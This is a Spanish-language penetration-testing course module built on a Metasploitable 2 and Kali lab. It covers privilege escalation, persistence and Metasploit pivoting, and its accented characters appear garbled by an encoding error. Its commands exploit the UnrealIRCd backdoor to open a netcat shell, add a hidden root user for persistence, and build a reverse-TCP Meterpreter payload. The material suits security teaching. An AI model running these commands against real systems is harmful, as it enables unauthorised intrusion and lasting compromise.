![wordlist](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/wordlist.png?raw=true)

*Hemos escaneado el puerto 25 (SMTP). Despu√©s de obtener m√°s informaci√≥n sobre el servicio, decidimos intentar enumerar los usuarios existentes, lo que hicimos primero con el marco metasploit y luego con la herramienta smtp-users-enum.*

# ***Consideraciones Generales:***

- *Consentimiento del Propietario: Obtener el consentimiento expl√≠cito del propietario del sistema antes de realizar pruebas de penetraci√≥n.*
- *Uso de Herramientas Especializadas: Utilizar herramientas especializadas, como Hydra para SSH y Telnet, o CrackMapExec para SMB y RDP, para realizar pruebas controladas.*
- *Documentaci√≥n Detallada: Documentar cada acci√≥n realizada, incluyendo hallazgos, exploits utilizados y resultados obtenidos.*
- *Comunicaci√≥n Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas y los resultados obtenidos.*
- *Es esencial llevar a cabo estas actividades de manera √©tica y responsable, garantizando siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables.*
- *Seguimiento √âtico y Legal: Realizar todas las actividades dentro de los l√≠mites √©ticos y legales, evitando cualquier da√±o no autorizado.*

5. Escalada de privilegios:

# **B√∫squeda de vulnerabilidades de escalada de privilegios.**

La b√∫squeda de vulnerabilidades de escalada de privilegios es crucial para evaluar la seguridad de un sistema y prevenir posibles amenazas. Aqu√≠ se describen algunos pasos y t√©cnicas comunes utilizadas para identificar vulnerabilidades que podr√≠an permitir a un atacante elevar sus privilegios:

- **Recolecci√≥n de Informaci√≥n:** Obtener informaci√≥n detallada sobre el sistema, incluyendo la versi√≥n del sistema operativo, servicios en ejecuci√≥n y configuraciones de seguridad.
- **Enumeraci√≥n de Usuarios y Grupos:** Utilizar comandos y herramientas como whoami, id, o net user para enumerar usuarios y grupos en el sistema.
- **Revisi√≥n de Pol√≠ticas de Seguridad:** Examinar las pol√≠ticas de seguridad del sistema para comprender las restricciones y configuraciones de acceso.
- **An√°lisis de Configuraciones:** Revisar las configuraciones de seguridad, como permisos de archivos, configuraciones de servicios y pol√≠ticas de control de acceso.
- **B√∫squeda de Vulnerabilidades Conocidas:** Utilizar bases de datos de vulnerabilidades, esc√°neres de vulnerabilidades y herramientas como Nessus o OpenVAS para identificar vulnerabilidades conocidas.
- **Pruebas Activas de Escalada de Privilegios:** Realizar pruebas activas, como intentos de explotaci√≥n, para identificar vulnerabilidades que podr√≠an conducir a la escalada de privilegios.

## **T√©cnicas Comunes:**

- **Elevaci√≥n de Privilegios del Usuario:** Buscar vulnerabilidades que permitan a un usuario regular elevar sus privilegios a niveles m√°s altos.
- **Explotaci√≥n de Servicios y Aplicaciones:** Buscar vulnerabilidades en servicios y aplicaciones que podr√≠an permitir la ejecuci√≥n de c√≥digo con privilegios elevados.
- **Ataques a Configuraciones D√©biles:** Identificar configuraciones de seguridad d√©biles o malas pr√°cticas que puedan ser explotadas para la escalada de privilegios.
- **Escalada de Privilegios a Nivel de Sistema:** Buscar vulnerabilidades que permitan a un usuario obtener privilegios de administrador o de sistema.
- **Explotaci√≥n de Servidores:** Investigar vulnerabilidades espec√≠ficas de servidores que puedan ser explotadas para la escalada de privilegios.

## **Herramientas Comunes:**

- **Windows-Exploit-Suggester:** Herramienta para identificar posibles exploits en sistemas Windows.
    - **Uso:** B√∫squeda de exploits para versiones espec√≠ficas de Windows.
- **Linux Exploit Suggester:** Herramienta para identificar posibles exploits en sistemas Linux.
    - **Uso:** B√∫squeda de exploits para versiones espec√≠ficas de sistemas Linux.
- **PowerUp:** PowerShell script para enumerar informaci√≥n y buscar vulnerabilidades en sistemas Windows.
    - **Uso:** Identificaci√≥n de posibles vectores de escalada de privilegios.
- **BeRoot:** Herramienta para verificar configuraciones y buscar vulnerabilidades en sistemas Linux.
    - **Uso:** B√∫squeda de debilidades que podr√≠an conducir a la escalada de privilegios.
    

<aside>
üëâ Es crucial llevar a cabo estas actividades de manera √©tica y responsable, obteniendo siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables. La comunicaci√≥n transparente de los hallazgos es fundamental para facilitar la mitigaci√≥n y mejorar la seguridad del sistema evaluado.

</aside>

# **Uso de t√©cnicas b√°sicas para elevar los privilegios.**

El uso de t√©cnicas b√°sicas para elevar los privilegios es un componente cr√≠tico en las pruebas de penetraci√≥n. Aqu√≠ se describen algunas t√©cnicas comunes que los profesionales de seguridad pueden utilizar para identificar y explotar vulnerabilidades que conduzcan a la escalada de privilegios:

1.  Explotaci√≥n de Servicios Vulnerables: Identificar servicios en ejecuci√≥n con vulnerabilidades conocidas y utilizar exploits espec√≠ficos para elevar los privilegios.
2.  Explotaci√≥n de Configuraciones D√©biles: Identificar configuraciones incorrectas o d√©biles que permitan la escalada de privilegios, como permisos inadecuados en archivos o directorios.
3. Inyecci√≥n de Comandos: Explotar vulnerabilidades que permitan la inyecci√≥n de comandos para ejecutar c√≥digo arbitrario con privilegios elevados.
4.  Explotaci√≥n de Vulnerabilidades de D√≠a Cero: Utilizar exploits de vulnerabilidades de d√≠a cero que a√∫n no han sido parcheadas por el fabricante.
5.  Ataques de Fuerza Bruta: Realizar ataques de fuerza bruta para obtener acceso no autorizado a cuentas de usuario con privilegios m√°s altos.
6.  Uso de Herramientas de Explotaci√≥n: Utilizar herramientas especializadas como Metasploit, PowerShell Empire o Covenant para automatizar la explotaci√≥n de vulnerabilidades y la escalada de privilegios.
7.  Explotaci√≥n de Servidores con Permisos Elevados: Identificar servicios que se ejecutan con privilegios elevados y buscar vulnerabilidades que permitan la manipulaci√≥n de esos servicios.
8.  Manipulaci√≥n de Tokens de Acceso: Modificar tokens de acceso para obtener privilegios adicionales en el sistema.
9.  Uso de Exploits para Escalada de Privilegios Espec√≠ficos del Sistema Operativo: Utilizar exploits espec√≠ficos para la escalada de privilegios en sistemas operativos particulares, como Windows o Linux.
10.  Explotaci√≥n de Vulnerabilidades de Aplicaciones Web: Identificar vulnerabilidades en aplicaciones web que permitan la escalada de privilegios a nivel de sistema.

## **Consideraciones Importantes:**

- Consentimiento del Propietario: Obtener el consentimiento expl√≠cito del propietario del sistema antes de realizar pruebas de penetraci√≥n.
- Documentaci√≥n Detallada: Documentar cada acci√≥n realizada, incluyendo hallazgos, exploits utilizados y resultados obtenidos.
- Seguimiento √âtico y Legal: Realizar todas las actividades dentro de los l√≠mites √©ticos y legales, evitando cualquier da√±o no autorizado.
- Comunicaci√≥n Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas y los resultados obtenidos.

<aside>
üí° Es esencial llevar a cabo estas actividades de manera √©tica y responsable, garantizando siempre el consentimiento del propietario del sistema y respetando las leyes y regulaciones aplicables. La escalada de privilegios debe ser realizada con el objetivo de mejorar la seguridad del sistema, identificar debilidades y facilitar la mitigaci√≥n.

</aside>

# **Obtenci√≥n de acceso privilegiado en el sistema objetivo**

La escalada de privilegios es el acto de explotar un error, una falla de dise√±o o la supervisi√≥n de la configuraci√≥n en un sistema operativo o aplicaci√≥n de software para obtener un acceso elevado a los recursos que normalmente est√°n protegidos de una aplicaci√≥n o usuario. Vamos a utilizar una distro de Linux vulnerable para poner un ejemplo de elevaci√≥n de privilegios, se trata de Metasploitable II. Nuestra m√°quina atacante ser√° un Kali Linux. El proceso que se va a llevar a cabo de manera resumida es el siguiente:

1. Buscamos los servicios que est√°n corriendo en la m√°quina Metasploitable.
2. Comprobamos si tiene vulnerabilidades.
3. Explotamos la vulnerabilidad que escogemos.
4. Estamos dentro con privilegios limitados, as√≠ que buscamos procesos corriendo como root y que no pertenezcan al kernel.
5. Buscamos un exploit que nos permita elevarnos y lo ejecutamos.

### Las m√°quinas y sus IPs son las siguientes:

- Kali Linux > 192.168.1.50
- Metasploitable II > 192.168.1.49

Buscando servicios en la m√°quina v√≠ctima. Para esta tarea usaremos nmap, el comando a ejecutar:

> nmap -p 1-65535 -T4 -sV 192.168.1.49


Como se va a usar Metasploit, podemos hacer uso de nmap en la propia herramienta (db_nmap), el resultado va a ser el mismo, pero se guardar√°n los resultados en la base de datos, para no perdernos antes borramos la base de datos con ‚Äúclear database‚Äù. La salida (no completa) se muestra en la siguiente captura:

![captura](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/captura.png?raw=true)

Ahora podemos consultar los servicios todas las veces que queramos con el comando services de Metasploit.

## **Buscamos posibles exploits**

Vamos a centrarnos en el puerto 21, el servicio FTP, y buscamos un posible exploit:

![exploits](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/exploits.png?raw=true)

Encontramos un exploit disponible para la versi√≥n que est√° corriendo en la m√°quina v√≠ctima. Configuramos el exploit y lo lanzamos:

![exploit disponible](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/exploit-disponible.png?raw=true)

Ya estamos dentro de la m√°quina v√≠ctima, y encima con el usuario root, que m√°s se puede pedir. En el pr√≥ximo post veremos que no siempre es tan f√°cil conseguir altos privilegios, y tendremos que trabajar un poco m√°s para llegar a ello.

# 6. Post-explotaci√≥n y persistencia

# **Mantenimiento del acceso obtenido en el sistema objetivo.**

El mantenimiento del acceso obtenido en el sistema objetivo es una fase cr√≠tica en las pruebas de penetraci√≥n, donde el objetivo es asegurar la persistencia y continuidad del acceso. Aqu√≠ se describen algunas t√©cnicas comunes utilizadas para mantener el acceso en el sistema:

1.  Creaci√≥n de Cuentas de Usuario Adicionales: Crear cuentas de usuario adicionales con privilegios elevados para asegurar el acceso incluso si las credenciales originales son revocadas.
2.  Creaci√≥n de Backdoors: Instalar backdoors en el sistema para permitir el acceso posterior incluso despu√©s de que las vulnerabilidades utilizadas inicialmente hayan sido parcheadas.
3.  Programaci√≥n de Tareas y Servicios: Configurar tareas programadas o servicios que se ejecuten de forma peri√≥dica para mantener el acceso persistente.
4.  Uso de Malware Persistente: Implantar malware persistente que se inicie autom√°ticamente con el sistema operativo para mantener el control del sistema.
5.  Modificaci√≥n de Configuraciones de Seguridad: Cambiar configuraciones de seguridad para permitir el acceso remoto o manipular configuraciones de firewall.
6.  Uso de T√∫neles Encubiertos: Establecer t√∫neles encubiertos o canales encubiertos para eludir la detecci√≥n y mantener una comunicaci√≥n encubierta.
7.  Ofuscaci√≥n de Actividades: Ofuscar las actividades realizadas para evitar la detecci√≥n, como cambiar nombres de archivos o enmascarar comandos.
8.  Uso de Certificados Maliciosos: Implementar certificados maliciosos para evadir la detecci√≥n de herramientas de seguridad.
9.  Uso de Canales Encubiertos en Protocolos Leg√≠timos: Utilizar canales encubiertos en protocolos leg√≠timos, como DNS o HTTP, para pasar desapercibido.
10.  Monitorizaci√≥n de Cambios en el Sistema: Monitorear cambios en el sistema y ajustar las t√°cticas en respuesta a las actualizaciones de seguridad.

<aside>
üìñ En este caso en vez de dar un o unos pocos ejemplos es tema que debemos abordar con mas profundidad. Con lo cual veremos una lista de recursos para profundizar acerca de este tema y que se pueda aprender en mayor profundidad. En esta gran recopilaci√≥n de t√©cnicas de persistencia podemos verlas mapeadas con Mitre e indicando adem√°s si se necesitan permisos o no de administrador en cada una de ellas:

</aside>

| T√©cnica | Mitre | Permisos de administrador |
| --- | --- | --- |
| https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/ | https://attack.mitre.org/techniques/T1004/ | SI |
| https://pentestlab.blog/2019/10/28/persistence-port-monitors/ | https://attack.mitre.org/techniques/T1013/ | SI |
| https://pentestlab.blog/2019/11/13/persistence-accessibility-features/ | https://attack.mitre.org/techniques/T1015/ | SI |
| https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/ | https://attack.mitre.org/techniques/T1023/ | NO |
| https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ | https://attack.mitre.org/techniques/T1031/ | SI |
| https://pentestlab.blog/2020/03/04/persistence-dll-hijacking/ | https://attack.mitre.org/techniques/T1038/ | SI |
| https://pentestlab.blog/2020/01/06/persistence-change-default-file-association/ | https://attack.mitre.org/techniques/T1042/ | NO |
| https://pentestlab.blog/2019/10/07/persistence-new-service/ | https://attack.mitre.org/techniques/T1050/ | SI |
| https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/ | https://attack.mitre.org/techniques/T1053/ | NO |
| https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ | https://attack.mitre.org/techniques/T1058/ | NO |
| https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/ | https://attack.mitre.org/techniques/T1060/ | NO |
| https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ | https://attack.mitre.org/techniques/T1084/ | SI |
| https://pentestlab.blog/2019/10/21/persistence-security-support-provider/ | https://attack.mitre.org/techniques/T1101/ | SI |
| https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/ | https://attack.mitre.org/techniques/T1103/ | SI |
| https://pentestlab.blog/2020/05/20/persistence-com-hijacking/ | https://attack.mitre.org/techniques/T1122/ | NO |
| https://pentestlab.blog/2019/10/29/persistence-netsh-helper-dll/ | https://attack.mitre.org/techniques/T1128/ | SI |
| https://pentestlab.blog/2019/12/11/persistence-office-application-startup/ | https://attack.mitre.org/techniques/T1137/ | NO |
| https://pentestlab.blog/2019/12/16/persistence-application-shimming/ | https://attack.mitre.org/techniques/T1138/ | SI |
| https://pentestlab.blog/2019/10/09/persistence-screensaver/ | https://attack.mitre.org/techniques/T1180/ | NO |
| https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/ | https://attack.mitre.org/techniques/T1183/ | SI |
| https://pentestlab.blog/2019/10/30/persistence-bits-jobs/ | https://attack.mitre.org/techniques/T1197/ | NO |
| https://pentestlab.blog/2019/10/22/persistence-time-providers/ | https://attack.mitre.org/techniques/T1209/ | SI |
| https://pentestlab.blog/2019/11/05/persistence-powershell-profile/ | https://attack.mitre.org/techniques/T1504/ | NO |
| https://pentestlab.blog/2020/02/04/persistence-waitfor/ | https://pentestlab.blog/methodologies/red-teaming/persistence/ | SI |
| https://pentestlab.blog/2020/02/12/persistence-rid-hijacking/ | https://pentestlab.blog/methodologies/red-teaming/persistence/ | SI |

# **Uso de backdoors y herramientas de persistencia**

El uso de backdoors y herramientas de persistencia es una t√©cnica com√∫n en pruebas de penetraci√≥n, pero es esencial comprender que estas acciones deben llevarse a cabo de manera √©tica y legal, con el consentimiento expl√≠cito del propietario del sistema. Aqu√≠ se describen algunas t√©cnicas comunes relacionadas con backdoors y persistencia:

Los backdoors son mecanismos ocultos que permiten el acceso no autorizado al sistema incluso despu√©s de que se hayan corregido las vulnerabilidades iniciales. 

### T√©cnicas:

> Inyecci√≥n de C√≥digo: Insertar c√≥digo malicioso en aplicaciones o scripts existentes para crear una puerta trasera.

> Creaci√≥n de Cuentas de Usuario Adicionales: Crear cuentas de usuario adicionales con privilegios elevados para garantizar el acceso persistente.

### Herramientas de Persistencia:

Estas herramientas se utilizan para mantener el acceso continuo al sistema, automatizando la ejecuci√≥n de comandos o acciones espec√≠ficas. Ejemplos de Herramientas:

> PowerShell Empire: Permite la creaci√≥n de agentes persistentes y automatiza la ejecuci√≥n de comandos.
 
> Covenant: Similar a PowerShell Empire, proporciona una plataforma para la creaci√≥n de backdoors y la automatizaci√≥n de acciones.

### Consideraciones Importantes:

- Requisito: Obtener el consentimiento expl√≠cito del propietario del sistema antes de utilizar backdoors o herramientas de persistencia.
- Uso Responsable: Limitar el uso de backdoors y herramientas de persistencia a lo estrictamente necesario para los fines de la prueba de penetraci√≥n.
- Documentaci√≥n Detallada: Documentar meticulosamente la creaci√≥n y el uso de backdoors, as√≠ como las herramientas de persistencia empleadas.
- Seguimiento Transparente: Comunicar de manera transparente con el cliente o el propietario del sistema sobre las acciones realizadas, incluyendo la implementaci√≥n de backdoors y herramientas de persistencia.
- Eliminaci√≥n Responsable: Eliminar todas las backdoors y herramientas de persistencia al finalizar las pruebas de penetraci√≥n, asegur√°ndose de no dejar puntos de acceso no autorizados.
- Evitar Da√±o No Autorizado: Evitar causar da√±o no autorizado al sistema, los datos o la integridad del entorno durante la utilizaci√≥n de backdoors y herramientas de persistencia.
- Es crucial recordar que la implementaci√≥n de backdoors y herramientas de persistencia debe realizarse con el √∫nico prop√≥sito de mejorar la seguridad del sistema y ayudar en la mitigaci√≥n de vulnerabilidades. La conducta √©tica y la transparencia son fundamentales en todas las etapas de las pruebas de penetraci√≥n.

## **Backdoors deUnrealIRCd y persistencia en Metasploitable 2**

UnrealIRCd es un servidor IRC Open Source. En el mes de noviembre del a√±o 2009 el archivo de nombre ‚ÄúUnreal3.2.8.1.tar.gz‚Äù fue reemplazado por una versi√≥n conteniendo una puerta trasera (troyano). Esta puerta trasera permit√≠a a cualquier persona ejecutar diversos comandos con los privilegios del usuario ejecutando ircd. La puerta trasera era ejecutada sin importar las restricciones del usuario. Para la siguiente pr√°ctica se utilizaremos, como siempre, Metasploitable 2 y Kali Linux.

Centramos la atenci√≥n en el servicio IRC del puerto TCP 6667.

![IRC](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/irc.png?raw=true)

Utilizaremos el Script NSE de nombre ‚Äúirc-unrealircd-backdoor.nse‚Äù incluida en Nmap, el cual permite verificar si este servidor IRC contiene la puerta trasera.

> nmap -n -Pn -p 6667 --script=irc-unrealircd-backdoor.nse 192.168.1.49

![script-irc](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/script-irc.png?raw=true)

El argumento de nombre "irc-unrealircd-backdoor.command" del script, puede ser utilizado para ejecutar comandos arbitrarios en el sistema remoto. Debido a la naturaleza de esta vulnerabilidad (El resultado nunca es devuelto) no se tiene manera de obtener la salida del comando.

> nmap -n -Pn -p 6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='nc -l -p 7777 -e /bin/sh' 192.168.1.49
> 

![backdoor](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/backdoor.png?raw=true)

Desde otra terminal se utiliza la herramienta netcat para establecer una conexi√≥n hacia el puerto TCP 7777.

# nc -n -vv 192.168.1.49 7777

![nc](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nc.png?raw=true)

> Uname -a

La conexi√≥n se ha establecido correctamente. Y ya se tiene acceso en el objetivo de evaluaci√≥n con los privilegios del usuario root. Completando el punto anterior podemos crear un user root para mantener nuestra persistencia.

> useradd -o --uid 0 superroot

![useradd](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/useradd.png?raw=true)

Herramientas para actividades

Para mantener el acceso, incluso despu√©s de reinicios y cierres, se necesita establecer una forma de persistencia. Estas herramientas pueden ayudar:

- **SharPyShell** ‚Äì Un shell obfuscado y altamente personalizable que es √∫til para mantener la persistencia.
- **SharpStay** ‚Äì Esta herramienta permite la persistencia a trav√©s de la creaci√≥n de tareas programadas.
- **SharpEventPersist** ‚Äì Un script que se utiliza para la persistencia a trav√©s de la suscripci√≥n a eventos de Windows.
- PowerShell Empire: Permite la creaci√≥n de agentes persistentes y automatiza la ejecuci√≥n de comandos.
- Covenant: Similar a PowerShell Empire, proporciona una plataforma para la creaci√≥n de backdoors y la automatizaci√≥n de acciones.
- Veil-Evasion es una herramienta que crea payloads ofuscados para eludir la detecci√≥n de antivirus y puede utilizarse para establecer persistencia.
- Beacon (Cobalt Strike): Beacon es una herramienta integrada en Cobalt Strike que permite a los actores de amenazas mantener el acceso persistente y controlar sistemas comprometidos.
- Meterpreter (Metasploit): Meterpreter, un m√≥dulo de Metasploit, proporciona funcionalidades avanzadas para el acceso y control persistente en sistemas comprometidos.

Responder es una herramienta que puede ser utilizada para realizar ataques de tipo "LLMNR/NBT-NS Spoofing" y obtener credenciales, lo que puede contribuir a la persistencia.

Recuerda que el conocimiento y uso de estas herramientas deben alinearse con pr√°cticas √©ticas y legales, y solo deben ser empleadas en entornos controlados con permisos adecuados.

# **Recopilaci√≥n de informaci√≥n adicional y movimiento lateral**

La recopilaci√≥n de informaci√≥n adicional y el movimiento lateral son fases fundamentales en las pruebas de penetraci√≥n, pero es esencial realizarlas de manera √©tica y legal, con el consentimiento expl√≠cito del propietario del sistema.

- Enumeraci√≥n de Red: Utilizar herramientas como Nmap o Nessus para escanear y enumerar activos en la red.
- Reconocimiento Activo: Utilizar herramientas como DNSenum para recopilar informaci√≥n sobre el dominio y sus subdominios.
- B√∫squeda de Informaci√≥n en Fuentes P√∫blicas: Investigar fuentes p√∫blicas, como redes sociales y sitios web, para recopilar informaci√≥n sobre empleados y la infraestructura.

## **Movimiento Lateral:**

Desplazarse lateralmente a trav√©s de la red, movi√©ndose de un sistema comprometido a otro, buscando oportunidades de escalada de privilegios.

- Uso de Credenciales Robadas: Utilizar credenciales robadas para autenticarse en otros sistemas y ampliar el alcance del acceso.
- Ataques de Pas-the-Ticket (PtT) o Pas-the-Hash (PtH): Utilizar tickets de Kerberos o hashes de contrase√±as para autenticarse en otros sistemas sin conocer la contrase√±a real.
- Ataques a Protocolos d√©biles: Explotar debilidades en protocolos como SMB para movimientos laterales.

## **Pivoting en Metasploit**

El pivoting: el proceso de acceder a redes a las que no tenemos acceso en circunstancias normales mediante el uso de computadoras comprometidas. Como punto de partida necesitaremos tener acceso a una m√°quina comprometida en la red objetivo, dependiendo de la configuraci√≥n del equipo de la v√≠ctima, es posible que necesitemos o no tener root o privilegios de administrador.

![Pivoting](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/pivoting.png?raw=true)

En las primeras fases de escaneo de un pentesting debemos intentar recopilar la mayor cantidad de informaci√≥n posible sobre las redes internas disponibles en la empresa. Muchas organizaciones dividen sus departamentos en segmentos de red o redes locales virtuales (VLANs), donde se alojan determinadas m√°quinas, en muchos casos los equipos que forman parte de una red tienen configuradas varias interfaces ya sean f√≠sicas o l√≥gicas hacia estas otras redes. En este tipo de circunstancias podemos aprovecharnos de esto para pivotar entre equipos de distintas redes y poder encontrar uno o varios equipos ya sean clientes o servidores con posibles vulnerabilidades explotables.

Para poner en pr√°ctica estas t√©cnicas realizaremos un taller completo en el que mostraremos dos escenarios muy similares: lab 1 y lab 2, con el fin de que se vea el concepto de pivoting entre m√°quinas que formen parte de otras redes distintas en las que desde un principio no tendr√≠amos una visibilidad directa hacia ellas desde la m√°quina en la que realizamos la auditor√≠a del test de intrusi√≥n. El nivel de pivoting de estos escenarios ser√° simple, de un solo salto, entre una m√°quina comprometida a otra. Dependiendo la topolog√≠a de red de la organizaci√≥n se podr√≠a complicar m√°s, con m√°s saltos entre m√°quinas para ir descubriendo las posibles redes internas existentes, pero la finalidad, el concepto y las t√©cnicas de pivoting seguir√≠an siendo las mismas.

En el siguiente escenario se mostrar√° un entorno formado por tres m√°quinas:

- Kali: 10.0.0.1/24. (M√°quina A)
- Ubuntu: 10.0.0.10/24 y 11.0.0.1/24. (M√°quina B)
- Linux (Apache http): 11.0.0.10/24. (M√°quina C)

![Maquinas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquinas.png?raw=true)

Desde VirtualBox la configuraci√≥n de las redes es as√≠:

Creamos una NAT desde herramientas.

![nat](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/nat.png?raw=true)

Kali tiene un adaptador puente

![kali-adaptador](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-adaptador.png?raw=true)

Linux tiene una NAT

![linux-nat](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/linux-nat.png?raw=true)

Ubuntu tiene:

> Adaptador 1: Adaptador puente

> Adaptador 2: Red Nat

La m√°quina Kali con Metasploit Framework ser√° desde donde realizaremos la intrusi√≥n. Tiene dos interfaces de red, una en modo NAT (eth1 simplemente para tener salida a Internet) y eth0 con la IP asignada 10.0.0.1 que forma parte de la red 10.0.0.0/24. Esta m√°quina no tiene visibilidad directa con la segunda red 11.0.0.0/24.

![kali-metasploit](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/kali-metasploit.png?raw=true)

La m√°quina Ubuntu tiene dos interfaces la cual tiene visibilidad con la red 10.0.0.0/24 y 11.0.0.0/24 ser√° el pivoting y la segunda m√°quina Linux con una sola interface con la ip asignada 11.0.0.10 que tendr√° visibilidad para la red 11.0.0.0.0/24, esta ser√° una posible m√°quina vulnerable ya que dispondr√° de un servicio web Apache a la que tendremos que intentar llegar desde la m√°quina Kali.

![ubuntu](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ubuntu.png?raw=true)

## **Establecer una sesi√≥n Meterpreter en la m√°quina Ubuntu (pivoting)**

El funcionamiento de los tipos de pivoting dentro de las posibilidades que nos ofrece Metasploit Framework debemos partir de la obtenci√≥n de una sesi√≥n Meterpreter en uno de los equipos de la red, en este caso ser√° el Ubuntu en el cual tiene visibilidad con las dos redes dentro de este laboratorio, esta ser√° la m√°quina que nos har√° de pivoting a las redes que tenga configuradas. Para este escenario podemos generar con msfvenom un payload en el que su shellcode ser√° un meterpreter linux y ejecutarlo en la m√°quina remota para obtener dicha sesi√≥n.

> msfvenom -p Linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o payload

- *b '\x00\x0a\x0d'*: (--bad-chars) Par√°metro en el que se le puede especificar una lista de caracteres a evitar, de modo que no provoque un posible error en el momento de ejecutar el payload. En este caso estos *[opcodes](https://en.wikipedia.org/wiki/Opcode)* ser√≠an v√°lidos.

![opcodes](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/opcodes.png?raw=true)

## **Route**

Una vez tenemos una sesi√≥n establecida con la m√°quina Ubuntu, iniciamos el meterpreter y una forma de comprobar las redes asociadas es listar las interfaces de red con *ipconfig* para comprobar si existe alguna direcci√≥n IP asignada que forme parte de otro segmento de red distinto. Tambi√©n podr√≠amos ejecutar una *shell* dentro de meterpreter y consultar la tabla de rutas con el comando *route print*. Como vemos se muestra la red 10.0.0.0/24 en la interface 2 y la 11.0.0.0/24 en la interface 3.

![route](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/route.png?raw=true)

***Route*** es un comando que nos permitir√° encaminar tr√°fico de red dentro de Metasploit, dici√©ndole que desde cualquier m√≥dulo todo el tr√°fico que queramos llevar hacia otra red lo haga a trav√©s del identificador de una sesi√≥n establecida que tengamos activa, por ejemplo con un Meterpreter.

Salimos de la sesi√≥n de meterpreter y la dejamos en segundo plano saliendo con el comando *background*. Fuera de meterpreter y sabiendo que la m√°quina Ubuntu tiene dos redes configuradas, hacemos uso del comando route para a√±adir la visibilidad de esta nueva red a nivel de Metasploit.

> route add <network> <netmask> <session_id>

> route add 11.0.0.0 255.255.255.0 1

Con esto le estaremos diciendo que todo el tr√°fico que se produzca dentro de Metasploit con destino a la red 11.0.0.0/24 lo enrute a trav√©s de la sesi√≥n con ID 1 donde est√° el meterpreter. Con *route print* dentro de Metasploit podemos ver las rutas asignadas y con *route -h* veremos la ayuda completa.

![meterpreter](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/meterpreter.png?raw=true)

De esta forma ya podremos pivotar a trav√©s de la m√°quina Ubuntu a la red 11.0.0.0/24 realizando un escaneo completo hacia esa red.

En el siguiente ejemplo y para ahorrar tiempo en esta demo delimitaremos un pool de direcciones IP de la red 11.0.0.0/24 comprobando √∫nicamente el puerto 80. Vemos que encontramos una direcci√≥n 10.0.0.10 que tiene el puerto 80 abierto.

En un descubrimiento habitual podr√≠amos usar el m√≥dulo *"auxiliary/scanner/discovery/arp_sweep"* para encontrar hosts activos en la red local a trav√©s de solicitudes arp y tambi√©n *"auxiliary/scanner/portscan/ack"* para comprobar que puertos se est√°n filtrado.

![arp_sweep](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/arp_sweep.png?raw=true)

Con lo anterior ya se demostr√≥ que podemos realizar un sondeo y tener acceso a redes pivotando a trav√©s de la m√°quina Ubuntu donde tenemos la sesi√≥n meterpreter hacia una m√°quina Linux con la ip 11.0.0.10.

Ya hemos descubierto que el puerto 80 est√° abierto por lo que es probable que se trate de un servicio web, podemos ahora comprobar la versi√≥n de ese servicio http a trav√©s del m√≥dulo "*auxiliary/scanner/http/http_version*". A partir de ah√≠ podr√≠amos buscar en Internet si existe alguna vulnerabilidad conocida y explotable para versi√≥n y continuar el test de intrusi√≥n.

![http_version](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/http_version.png?raw=true)

## **Autoroute (M√≥dulo post)**

Otra forma de establecer rutas es hacerlo de forma autom√°tica. Una vez que tenemos una sesi√≥n establecida podemos hacer uso del m√≥dulo "*post/multi/manage/autoroute*", establecemos el ID de sesi√≥n y lo ejecutamos.

Esto har√° un barrido en el equipo donde tenemos establecida la sesi√≥n para intentar reconocer otras redes asociadas a esa m√°quina y las agregar√° autom√°ticamente a nuestra tabla de rutas de Metasploit. Es lo mismo que lo comentado anteriormente pero de forma autom√°tica sin necesidad de consultar manualmente a trav√©s de meterpreter las tablas de rutas asociadas a la m√°quina comprometida.

![rutas asociadas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/rutas-asociadas.png?raw=true)

## **portfwd (Port Forwarding)**

**portfwd** realiza un reenv√≠o de puertos *-port forwarding-* entre m√°quinas. Podemos canalizar todo el tr√°fico que enviamos a un puerto local a la escucha de nuestra m√°quina A a un puerto e IP de una m√°quina C en la que no tenemos a priori conectividad, configurando esta IP y puerto de reenv√≠o en una m√°quina B en la que si tenemos una conectividad directa.

Una ventaja de esto es que todas las peticiones que hagamos al puerto local de la m√°quina A esta las reenviar√° a la m√°quina C pasando por la m√°quina B, si analizamos el tr√°fico desde la m√°quina C veremos que esas peticiones llegan desde la m√°quina B y no desde la m√°quina A que inicialmente origina las peticiones. Como esto en un primer momento puede resultar un poco confuso mostraremos un ejemplo.

